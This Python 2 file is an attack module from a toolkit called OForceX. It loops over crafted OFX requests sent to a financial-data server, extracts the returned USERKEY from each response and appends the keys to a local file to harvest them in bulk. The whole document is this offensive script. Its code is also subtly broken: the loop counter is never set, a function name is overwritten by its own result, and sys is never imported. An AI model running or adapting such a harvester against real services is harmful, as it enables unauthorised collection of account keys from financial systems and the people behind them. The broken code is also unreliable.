#!/usr/bin/python
#
# bf_userkey_harvest.py
#
# A portion of OForceX
# Written by Antimoon
#

def attack_bf_userkey_harvest(keyfile='userkeys', attacklen=1000):
    '''This attack module leverages the genuserkey function to harvest 
       a large number of userkeys'''

    global path
    global httphost

    try:
        while i <= attacklen:
            ofxbody        = ofx_body_builder()
            ofxheaders     = ofxheaders()
            content_length = str(len(ofxheaders+ofxbody))
            httpheaders    = header_builder(path, httphost, content_length)
            requestfull    = httpheaders + ofxheaders + ofxbody
            out            = http_request(httphost, requestfull, ssl=True, port=443)
            key            = out.split('<USERKEY>')[1].split('</USERKEY>')[0]

            file = open(keyfile, "a")
            file.write(key)
            file.close()

            i+=1

        sys.exit(0)

    except Exception, e:
        print '[!] Error %s' % e
        sys.exit(1)
